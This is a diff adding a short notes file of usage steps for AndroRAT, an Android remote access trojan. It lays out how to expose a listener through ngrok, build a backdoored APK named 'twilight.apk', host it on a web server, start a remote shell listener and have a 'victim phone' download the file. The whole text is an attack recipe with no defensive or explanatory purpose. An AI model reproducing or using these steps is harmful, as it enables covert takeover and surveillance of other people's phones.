@@ -1,0 +1,17 @@
+AndroRAT - Android remote administration tool
+Source: https://github.com/karma9874/AndroRAT.git
+
+Ngrok setup:
+  Download ngrok file from official website and extract it
+  Connect your account using ngrok authtoken
+
+Options:
+  ngrok tcp 4444            Host backdoor to WAN
+  python3 androRAT.py --build -i <NGROK_IP_ADDRESS_PORT> -p 14266 -o twilight.apk  
+                            Build backdoor
+  sudo cp twilight.apk /var/www/html/
+                            Move backdoor to server
+  python3 androRAT.py --shell -i <IP_ADDRESS> -p 4444 
+                            Set up our listener
+  victim phone download file from link
+                            <IP_ADDRESS>/twilight.apk
